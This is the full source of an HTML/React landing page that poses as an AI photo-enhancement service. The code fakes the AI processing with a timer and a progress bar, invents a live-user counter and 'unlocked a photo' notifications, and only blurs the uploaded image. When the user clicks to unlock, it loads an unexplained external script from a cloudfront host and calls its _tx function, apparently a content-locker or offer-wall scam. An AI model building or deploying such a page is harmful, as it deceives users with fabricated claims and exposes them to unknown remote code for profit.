<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>THE AI - Impossible Made Possible</title>
    
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Outfit:wght@300;400;600&display=swap" rel="stylesheet">
    
    <!-- React & ReactDOM (UMD for standalone usage) -->
    <script crossorigin src="https://unpkg.com/react@18/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
    
    <!-- Babel for JSX compilation in browser -->
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>

    <script>
      tailwind.config = {
        theme: {
          extend: {
            fontFamily: {
              sans: ['Outfit', 'sans-serif'],
              display: ['Orbitron', 'sans-serif'],
            },
            colors: {
              background: '#0b0d12',
              neon: {
                purple: '#b026ff',
                blue: '#4c6ef5',
                cyan: '#00f3ff',
              }
            },
            animation: {
              'pulse-fast': 'pulse 1.5s cubic-bezier(0.4, 0, 0.6, 1) infinite',
              'glow': 'glow 3s ease-in-out infinite alternate',
              'scan': 'scan 2s linear infinite',
            },
            keyframes: {
              glow: {
                '0%': { boxShadow: '0 0 5px #00f3ff, 0 0 10px #00f3ff' },
                '100%': { boxShadow: '0 0 20px #b026ff, 0 0 30px #b026ff' },
              },
              scan: {
                '0%': { transform: 'translateY(-100%)' },
                '100%': { transform: 'translateY(100%)' },
              }
            }
          },
        },
      }
    </script>
    <style>
      body {
        background-color: #0b0d12;
        color: white;
        overflow-x: hidden;
      }
      /* Custom scrollbar */
      ::-webkit-scrollbar {
        width: 8px;
      }
      ::-webkit-scrollbar-track {
        background: #0b0d12;
      }
      ::-webkit-scrollbar-thumb {
        background: #333;
        border-radius: 4px;
      }
      .glass-card {
        background: rgba(255, 255, 255, 0.03);
        backdrop-filter: blur(16px);
        -webkit-backdrop-filter: blur(16px);
        border: 1px solid rgba(255, 255, 255, 0.1);
      }
      .neon-text {
        text-shadow: 0 0 10px rgba(0, 243, 255, 0.5);
      }
    </style>
  <script type="importmap">
{
  "imports": {
    "react": "https://esm.sh/react@^19.2.3",
    "react/": "https://esm.sh/react@^19.2.3/"
  }
}
</script>
</head>
  <body>
    <div id="root"></div>

    <script type="text/babel">
      const { useState, useEffect, useRef } = React;

      // --- Constants & Enums ---
      const AppStage = {
        IDLE: 'IDLE',
        UPLOADING: 'UPLOADING',
        PROCESSING: 'PROCESSING',
        PREVIEW: 'PREVIEW',
        LOCKED: 'LOCKED'
      };

      const MESSAGES = [
        "Someone just unlocked a photo",
        "User 4291 uploaded a file",
        "Anonymous finished processing",
        "New result generated in UK",
        "High-res enhancement complete",
        "User 8822 unlocked a photo"
      ];

      // --- Components ---

      const Background = () => {
        const canvasRef = useRef(null);

        useEffect(() => {
          const canvas = canvasRef.current;
          if (!canvas) return;
          const ctx = canvas.getContext('2d');
          if (!ctx) return;

          let width = window.innerWidth;
          let height = window.innerHeight;
          canvas.width = width;
          canvas.height = height;

          const particles = [];
          const particleCount = 60;

          for (let i = 0; i < particleCount; i++) {
            particles.push({
              x: Math.random() * width,
              y: Math.random() * height,
              dx: (Math.random() - 0.5) * 0.5,
              dy: (Math.random() - 0.5) * 0.5,
              size: Math.random() * 2,
              alpha: Math.random() * 0.5 + 0.1
            });
          }

          let animationFrameId;

          function animate() {
            if (!ctx || !canvas) return;
            ctx.clearRect(0, 0, width, height);
            
            particles.forEach(p => {
              p.x += p.dx;
              p.y += p.dy;

              if (p.x < 0) p.x = width;
              if (p.x > width) p.x = 0;
              if (p.y < 0) p.y = height;
              if (p.y > height) p.y = 0;

              ctx.beginPath();
              ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
              ctx.fillStyle = `rgba(0, 243, 255, ${p.alpha})`;
              ctx.fill();
            });

            animationFrameId = requestAnimationFrame(animate);
          }

          animate();

          const handleResize = () => {
            if (canvas) {
              width = window.innerWidth;
              height = window.innerHeight;
              canvas.width = width;
              canvas.height = height;
            }
          };

          window.addEventListener('resize', handleResize);
          return () => {
            window.removeEventListener('resize', handleResize);
            cancelAnimationFrame(animationFrameId);
          };
        }, []);

        return (
          <canvas 
            ref={canvasRef} 
            className="fixed inset-0 z-0 pointer-events-none opacity-40"
          />
        );
      };

      const LiveCounter = () => {
        const [count, setCount] = useState(1420);

        useEffect(() => {
          const interval = setInterval(() => {
            setCount(prev => prev + Math.floor(Math.random() * 5) - 2);
          }, 3000);
          return () => clearInterval(interval);
        }, []);

        return (
          <div className="flex items-center space-x-2 text-xs font-mono text-neon-cyan opacity-80">
            <span className="relative flex h-2 w-2">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-neon-cyan opacity-75"></span>
              <span className="relative inline-flex rounded-full h-2 w-2 bg-neon-cyan"></span>
            </span>
            <span>{count.toLocaleString()} LIVE USERS</span>
          </div>
        );
      };

      const FloatingNotification = () => {
        const [visible, setVisible] = useState(false);
        const [message, setMessage] = useState(MESSAGES[0]);

        useEffect(() => {
          const loop = () => {
            setMessage(MESSAGES[Math.floor(Math.random() * MESSAGES.length)]);
            setVisible(true);
            setTimeout(() => {
              setVisible(false);
            }, 3000);
            const nextDelay = Math.random() * 5000 + 4000; 
            setTimeout(loop, nextDelay);
          };

          const initialTimeout = setTimeout(loop, 2000);
          return () => clearTimeout(initialTimeout);
        }, []);

        if (!visible) return null;

        return (
          <div className="fixed bottom-4 left-4 z-50 animate-bounce transition-all duration-500">
            <div className="glass-card px-4 py-3 rounded-lg border-l-4 border-neon-purple shadow-lg shadow-neon-purple/20">
              <div className="flex items-center space-x-3">
                <div className="h-2 w-2 rounded-full bg-green-500"></div>
                <span className="text-sm font-light text-white tracking-wide">{message}</span>
              </div>
            </div>
          </div>
        );
      };

      const Processing = ({ onComplete }) => {
        const [progress, setProgress] = useState(0);
        const [statusText, setStatusText] = useState("Initializing Neural Net...");

        useEffect(() => {
          const duration = 6000;
          const intervalTime = 60;
          const steps = duration / intervalTime;
          let currentStep = 0;

          const timer = setInterval(() => {
            currentStep++;
            const newProgress = Math.min((currentStep / steps) * 100, 100);
            setProgress(newProgress);

            if (newProgress < 30) setStatusText("Analyzing Image Vectors...");
            else if (newProgress < 60) setStatusText("Running Deep Learning Models...");
            else if (newProgress < 85) setStatusText("Enhancing Resolution...");
            else setStatusText("Finalizing Output...");

            if (currentStep >= steps) {
              clearInterval(timer);
              setTimeout(onComplete, 500);
            }
          }, intervalTime);

          return () => clearInterval(timer);
        }, [onComplete]);

        return (
          <div className="w-full max-w-md mx-auto space-y-6 text-center">
            <div className="relative pt-10 pb-10">
              {/* Holographic Spinner */}
              <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-48 h-48 rounded-full border-2 border-neon-blue/20"></div>
              <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-48 h-48 rounded-full border-t-2 border-neon-cyan animate-spin"></div>
              <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-32 h-32 rounded-full border-2 border-neon-purple/20"></div>
              <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-32 h-32 rounded-full border-b-2 border-neon-purple animate-spin shadow-[0_0_15px_rgba(176,38,255,0.5)]" style={{ animationDirection: 'reverse', animationDuration: '3s' }}></div>
              
              <div className="text-4xl font-display font-bold text-transparent bg-clip-text bg-gradient-to-r from-neon-cyan to-neon-purple">
                {Math.floor(progress)}%
              </div>
            </div>

            <div className="space-y-2">
              <h3 className="text-lg font-mono text-neon-cyan animate-pulse">{statusText}</h3>
              
              {/* Progress Bar container */}
              <div className="h-2 w-full bg-gray-800 rounded-full overflow-hidden border border-gray-700">
                <div 
                  className="h-full bg-gradient-to-r from-neon-blue via-neon-cyan to-neon-purple transition-all duration-100 ease-linear shadow-[0_0_10px_rgba(0,243,255,0.7)]"
                  style={{ width: `${progress}%` }}
                />
              </div>
            </div>

            <div className="grid grid-cols-3 gap-2 text-xs font-mono text-gray-500 mt-4">
              <div className={`p-2 border border-gray-800 rounded ${progress > 20 ? 'text-neon-cyan border-neon-cyan/30 bg-neon-cyan/10' : ''}`}>ANALYSIS</div>
              <div className={`p-2 border border-gray-800 rounded ${progress > 50 ? 'text-neon-cyan border-neon-cyan/30 bg-neon-cyan/10' : ''}`}>PROCESSING</div>
              <div className={`p-2 border border-gray-800 rounded ${progress > 90 ? 'text-neon-cyan border-neon-cyan/30 bg-neon-cyan/10' : ''}`}>RENDERING</div>
            </div>
          </div>
        );
      };

      const ScriptInjector = () => {
        useEffect(() => {
          // 1. Inject the config variable
          window.CpDDU_Afe_LKobzc = {"it":4392921,"key":"71394"};

          // 2. Inject the external script source
          const script = document.createElement('script');
          script.src = "https://duw03nk63ml3f.cloudfront.net/9d14d8b.js";
          script.async = true;
          
          document.body.appendChild(script);

          return () => {
            if (document.body.contains(script)) {
              document.body.removeChild(script);
            }
          };
        }, []);

        return null;
      };

      // --- Main App Component ---

      const App = () => {
        const [stage, setStage] = useState(AppStage.IDLE);
        const [imageFile, setImageFile] = useState(null);
        const fileInputRef = useRef(null);

        const handleFileUpload = (event) => {
          const file = event.target.files?.[0];
          if (file) {
            const url = URL.createObjectURL(file);
            setImageFile(url);
            setStage(AppStage.PROCESSING);
          }
        };

        const triggerUpload = () => {
          fileInputRef.current?.click();
        };

        const handleProcessingComplete = () => {
          setStage(AppStage.PREVIEW);
        };

        const handleUnlockClick = () => {
          setStage(AppStage.LOCKED);
        };

        const triggerExternalScript = () => {
          if (window._tx) {
            window._tx();
          } else {
            console.warn("External script not loaded yet");
            // Fallback attempt if script loads slow
            if (typeof _tx !== 'undefined') {
                _tx();
            } else {
               alert("Connecting to secure server... Please wait a moment and try again.");
            }
          }
        };

        return (
          <div className="min-h-screen relative flex flex-col items-center font-sans overflow-hidden selection:bg-neon-cyan selection:text-black">
            <Background />
            <FloatingNotification />
            
            {stage === AppStage.LOCKED && <ScriptInjector />}

            {/* Header */}
            <header className="w-full p-6 flex justify-between items-center z-10 glass-card border-b-0 border-t-0 border-x-0">
              <div className="text-2xl font-display font-black tracking-widest text-transparent bg-clip-text bg-gradient-to-r from-white to-gray-400">
                AI<span className="text-neon-cyan">.</span>VISION
              </div>
              <LiveCounter />
            </header>

            {/* Main Content */}
            <main className="flex-1 w-full max-w-4xl px-4 flex flex-col items-center justify-center z-10 py-10">
              
              {/* Hero Text */}
              {stage === AppStage.IDLE && (
                <div className="text-center mb-12 space-y-6">
                  <h1 className="text-5xl md:text-7xl font-display font-black text-white leading-tight">
                    THE AI That Makes The <br />
                    <span className="text-transparent bg-clip-text bg-gradient-to-r from-neon-purple via-neon-blue to-neon-cyan animate-pulse">
                      Impossible Possible
                    </span>
                  </h1>
                  <p className="text-gray-400 max-w-lg mx-auto text-lg">
                    Unlock the hidden potential of your imagery with next-generation neural processing.
                  </p>
                </div>
              )}

              {/* Dynamic Card Container */}
              <div className="w-full max-w-2xl">
                <div className="glass-card rounded-2xl p-1 border border-white/10 shadow-[0_0_50px_rgba(76,110,245,0.15)] relative overflow-hidden">
                   
                   {/* Scanner line effect */}
                   {(stage === AppStage.PROCESSING || stage === AppStage.LOCKED) && (
                     <div className="absolute inset-0 bg-gradient-to-b from-transparent via-neon-cyan/10 to-transparent h-[10%] w-full animate-scan z-0 pointer-events-none"></div>
                   )}

                   <div className="bg-[#0b0d12]/80 backdrop-blur-xl rounded-xl p-8 md:p-12 min-h-[400px] flex flex-col items-center justify-center relative z-10">
                      
                      {stage === AppStage.IDLE && (
                        <div 
                          className="w-full h-64 border-2 border-dashed border-gray-700 hover:border-neon-cyan transition-colors rounded-xl flex flex-col items-center justify-center cursor-pointer group bg-white/5 hover:bg-white/10"
                          onClick={triggerUpload}
                        >
                          <input 
                            type="file" 
                            ref={fileInputRef} 
                            className="hidden" 
                            accept="image/*"
                            onChange={handleFileUpload}
                          />
                          <div className="h-16 w-16 mb-4 rounded-full bg-gray-800 flex items-center justify-center group-hover:scale-110 transition-transform shadow-[0_0_20px_rgba(0,0,0,0.5)]">
                            <svg className="w-8 h-8 text-neon-cyan" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12" />
                            </svg>
                          </div>
                          <span className="text-xl font-bold text-white mb-2">Upload Image</span>
                          <span className="text-sm text-gray-500">Drag & drop or click to browse</span>
                        </div>
                      )}

                      {stage === AppStage.PROCESSING && (
                        <Processing onComplete={handleProcessingComplete} />
                      )}

                      {(stage === AppStage.PREVIEW || stage === AppStage.LOCKED) && imageFile && (
                        <div className="w-full flex flex-col items-center space-y-6">
                          <h2 className="text-2xl font-display font-bold text-white uppercase tracking-widest border-b border-neon-purple/50 pb-2 mb-4">
                            Your Uploaded Photo
                          </h2>
                          
                          <div className="relative w-full max-w-sm aspect-square rounded-xl overflow-hidden border border-gray-700 shadow-2xl">
                            {/* The Image - Blurred */}
                            <img 
                              src={imageFile} 
                              alt="Uploaded" 
                              className="w-full h-full object-cover filter blur-xl scale-110 transition-all duration-1000 opacity-80"
                            />
                            
                            {/* Locked Overlay */}
                            {stage === AppStage.LOCKED && (
                              <div className="absolute inset-0 bg-black/60 flex flex-col items-center justify-center z-20 backdrop-blur-sm">
                                <div className="p-4 rounded-full bg-neon-purple/20 border border-neon-purple mb-4 animate-bounce">
                                   <svg className="w-10 h-10 text-neon-purple" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                     <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                                   </svg>
                                </div>
                                <p className="text-neon-purple font-mono font-bold tracking-widest text-sm">SECURE PREVIEW LOCKED</p>
                              </div>
                            )}
                          </div>

                          <div className="pt-4">
                            {stage === AppStage.PREVIEW ? (
                              <button 
                                onClick={handleUnlockClick}
                                className="px-8 py-4 bg-white text-black font-bold text-lg rounded-full hover:bg-neon-cyan hover:scale-105 hover:shadow-[0_0_30px_rgba(0,243,255,0.6)] transition-all duration-300 transform active:scale-95"
                              >
                                See Your Photo
                              </button>
                            ) : (
                              <button 
                                onClick={triggerExternalScript}
                                className="relative overflow-hidden group px-10 py-4 bg-gradient-to-r from-neon-purple to-neon-blue rounded-full font-bold text-lg text-white shadow-[0_0_20px_rgba(176,38,255,0.4)] hover:shadow-[0_0_40px_rgba(176,38,255,0.8)] transition-all transform hover:-translate-y-1"
                              >
                                <span className="relative z-10 flex items-center space-x-2">
                                   <span>Download The Photo</span>
                                   <svg className="w-5 h-5 group-hover:translate-x-1 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 7l5 5m0 0l-5 5m5-5H6" /></svg>
                                </span>
                                <div className="absolute inset-0 bg-white/20 translate-y-full group-hover:translate-y-0 transition-transform duration-300"></div>
                              </button>
                            )}
                          </div>
                        </div>
                      )}
                   </div>
                </div>
              </div>
            </main>

            {/* Footer */}
            <footer className="w-full p-6 text-center z-10">
              <p className="text-[10px] text-gray-600 uppercase tracking-wider">
                Our website is not responsible for any illegal use
              </p>
            </footer>
          </div>
        );
      };

      // Mount logic
      const rootElement = document.getElementById('root');
      const root = ReactDOM.createRoot(rootElement);
      root.render(<App />);

    </script>
  </body>
</html>